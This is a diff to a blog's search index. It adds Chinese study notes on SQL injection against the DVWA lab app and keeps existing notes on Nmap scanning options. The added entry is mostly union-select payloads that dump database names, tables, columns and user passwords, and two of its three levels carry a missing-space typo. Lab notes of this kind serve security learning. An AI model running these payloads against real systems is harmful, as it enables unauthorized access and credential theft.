@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[DVWA1.10-SQL Injection Payload]]></title>
+    <url>%2F2019%2F09%2F08%2FDVWA-SQL-Injection-Payload%2F</url>
+    <content type="text"><![CDATA[0x01 Low （get注入） 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x02 Medium（post注入（抓包））： 查数据库 1-1 &apos;union select 1,group_concat(schema_name) frominformation_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x03 High（get注入（与Low级别区别只在于多了一个LIMIT 1）） 查数据 1-1 union select 1,group_concat(schema_name) frominformation_schema.schemata where schema_name=database() # 查表名 1-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 union select 1,group_concat(user,password) from users #]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>DVWA</tag>
+        <tag>SQL注入</tag>
+        <tag>Payload</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Nmap常用参数笔记]]></title>
     <url>%2F2019%2F08%2F08%2FNmap%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E7%AC%94%E8%AE%B0%2F</url>
     <content type="text"><![CDATA[0x01主机发现（基本功能：探测主机存活）nmap -sP ip段 （ ping扫描做出响应的主机） nmap -sn ip段 （ 测试过对方主机把icmp包都丢弃掉） nmap -sA ip段 （ 发送tcp的ack包进行探测） 0x02端口扫描（基本功能：扫描端口）nmap -p0-65535 ip （TCP） nmap -sS ip 半开放扫描 SYN扫描 （非3次握手的tcp扫描） nmap -sT ip 3次握手方式tcp扫描 （等同于nmap ip） （UDP） nmap -sU ip 0x03版本扫描nmap -O ip 扫描操作系统版本 nmap -sV ip 扫描服务器版本 nmap -T 4 -A ip 综合扫描 扫描出开放端口、服务器版本、系统版本 -t 表示时间 nmap -v -Pn ip 无ping扫描 有些防火墙禁止ping 可以使用此选项 -v 显示详细扫描信息 nmap --script &lt;脚本名&gt; 192.168.198.131 用脚本扫描是否存在漏洞 0x04输出参数 参数 -oN 标准保存 -oX XML保存 -oG Grep保存 -oA 保存到所有格式 -append-output 补充保存文件]]></content>
